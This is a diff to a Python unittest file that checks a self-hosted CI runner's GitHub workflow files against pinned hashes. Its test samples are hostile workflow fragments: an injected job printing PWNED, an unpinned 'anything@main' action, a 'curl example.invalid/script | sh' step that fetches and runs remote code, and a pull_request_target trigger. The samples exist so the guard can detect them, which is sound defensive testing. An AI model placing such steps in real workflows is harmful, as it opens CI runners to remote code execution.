@@ -170,17 +170,41 @@ class HomeRunnerTrustContract(unittest.TestCase):
         for name in WORKFLOW_SHA256:
             original = (ROOT / ".github/workflows" / name).read_bytes()
             samples = (
-                original + b"\n  Evil_job:\\n    runs-on: [self-hosted, zamerovac-qa]\\n    steps:\\n      - run: echo PWNED\\n",
-                original + b"\n      - uses: anything@main\\n",
-                original + b"\n      - run: curl example.invalid/script | sh\\n",
-                original + b"\npull_request_target: {}\\n",
+                original.replace(
+                    b"jobs:\n",
+                    b"jobs:\n  Evil_job:\n    runs-on: [self-hosted, zamerovac-qa]\n"
+                    b"    steps:\n      - run: echo PWNED\n", 1,
+                ),
+                original.replace(
+                    b"      - name:",
+                    b"      - uses: anything@main\n      - name:", 1,
+                ),
+                original.replace(
+                    b"      - name:",
+                    b"      - run: curl example.invalid/script | sh\n      - name:", 1,
+                ),
+                original.replace(
+                    b"on:\n", b"on:\n  pull_request_target: {}\n", 1,
+                ),
             )
             for mutated in samples:
-                with self.subTest(workflow=name, mutation=mutated[-90:]):
-                    self.assertNotEqual(original, mutated)
+                with self.subTest(workflow=name, mutation=mutated[:100]):
+                    self.assertNotEqual(original, mutated, "Mutace musi zmenit YAML")
                     self.assertTrue(workflow_snapshot_violations(name, mutated))
         self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"x.yaml"}))
         self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"unsafe.yml"}))
+
+    def test_snapshot_guard_tolerates_windows_crlf(self):
+        for name in WORKFLOW_SHA256:
+            original = (ROOT / ".github/workflows" / name).read_bytes()
+            canonical = original.replace(b"\r\n", b"\n")
+            with self.subTest(workflow=name):
+                self.assertEqual([], workflow_snapshot_violations(name, canonical))
+                self.assertEqual(
+                    [], workflow_snapshot_violations(
+                        name, canonical.replace(b"\n", b"\r\n")
+                    ),
+                )
 
     def test_actual_home_qa_is_restricted(self):
         self.assertEqual([], qa_violations(QA.read_text(encoding="utf-8")))
